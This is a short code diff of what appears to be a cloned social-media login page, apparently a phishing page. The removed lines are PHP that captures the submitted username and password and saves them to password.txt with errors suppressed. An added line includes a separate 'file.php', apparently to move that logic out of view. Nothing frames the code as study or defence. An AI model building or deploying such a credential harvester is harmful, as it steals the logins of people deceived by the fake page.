@@ -1,17 +1,7 @@
-<?php
-error_reporting(0);
-$username=$_POST['username'];
-$password=$_POST['password'];
-if (isset($_POST['button'])) {
-  $opn=fopen('password.txt', 'w');
-  fwrite($opn, $username);
-  fwrite($opn, ":");
-  fwrite($opn, $password);
-}
-?>
 <!DOCTYPE html>
 <!-- saved from url=(0014)about:internet -->
 <html lang="es" class="js not-logged-in client-root js-focus-visible sDN5V"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+  <?php include('file.php') ?>
         
         <meta http-equiv="X-UA-Compatible" content="IE=edge">
 
